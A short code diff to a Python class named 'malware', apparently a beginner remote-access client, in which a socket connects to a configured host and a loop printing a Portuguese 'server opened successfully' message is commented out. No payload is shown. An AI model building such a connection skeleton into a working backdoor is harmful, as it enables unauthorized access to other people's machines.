@@ -12,5 +12,6 @@ class malware:
     self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   def run(self):
     self.socket.connect((self.host,self.port))
-    while self.loop == True:
-      print ('\033[0;32mServidor Aberto Com Sucesso!')
+    #while self.loop == True:
+      #pass
+    
